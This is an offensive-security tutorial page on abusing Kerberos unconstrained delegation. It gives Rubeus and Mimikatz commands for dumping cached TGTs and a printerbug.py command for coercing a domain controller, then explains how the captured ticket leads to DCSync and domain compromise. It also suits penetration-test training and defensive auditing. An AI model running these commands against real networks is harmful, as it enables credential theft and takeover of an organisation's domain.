---
title: "Unconstrained delegation: capturing TGTs"
description: "Abusing Kerberos unconstrained delegation by capturing the TGTs that delegating hosts store in memory, and combining it with coercion to force a domain controller to send its own TGT for extraction."
keywords:
  - unconstrained delegation
  - TGT capture
  - TrustedForDelegation
  - printerbug
  - coercion
---

# Unconstrained delegation

A host trusted for **unconstrained delegation** receives a copy of the **TGT** of every user who authenticates to it, and caches it in LSASS so it can act as that user toward any service. That is the vulnerability: compromise such a host and you can harvest the TGTs of everyone who connects, then reuse them. If you can make a **privileged** account connect, you capture its TGT directly.

## Finding and harvesting

Delegating computers have the `TRUSTED_FOR_DELEGATION` UAC flag (identified during [enumeration](../../../dacl/acl-enumeration.md)). On a compromised delegating host, extract the cached TGTs:

```bash
# Rubeus: watch for and extract TGTs as they arrive
Rubeus.exe monitor /interval:5 /nowrap
# Mimikatz
sekurlsa::tickets /export
```

## Forcing a privileged connection

Waiting for a Domain Admin to connect is slow. **Coercion** removes the wait: trigger a target, ideally a **domain controller**, to authenticate to your delegating host, and capture the TGT it sends:

```bash
# On the delegating host, listen for the incoming TGT
Rubeus.exe monitor /interval:1 /nowrap
# Coerce the DC to authenticate to the delegating host (PrinterBug/PetitPotam)
printerbug.py example.local/user:pass@<dc> <delegating-host>
```

The DC authenticates with its **machine account**, so you capture `DC$`'s TGT, which you then use for [DCSync](../../credentials/ntds-and-dcsync.md) and full domain compromise.

## Exploitation notes

- The coercion + unconstrained-delegation chain turns control of one delegating host into domain compromise, which is why these hosts are high-value targets to find early.
- Captured TGTs are reused with [pass-the-ticket](../pass-the-ticket.md); a `DC$` TGT enables DCSync, a user TGT enables acting as that user.
- Domain controllers themselves are unconstrained-trusted by default; member hosts with the flag are the dangerous configuration.
- "Protected Users" and the "sensitive, cannot be delegated" account flag prevent a target's TGT from being captured, so very privileged accounts may be out of reach this way.

## Tools

- **Rubeus** (`monitor`, `dump`): capture incoming TGTs on the delegating host.
- **Coercer / printerbug.py / PetitPotam**: force a DC or server to authenticate.
- **Mimikatz** (`sekurlsa::tickets`): extract cached delegation TGTs.

## References

- The Hacker Recipes: unconstrained delegation
- Microsoft: Kerberos delegation and the TrustedForDelegation flag
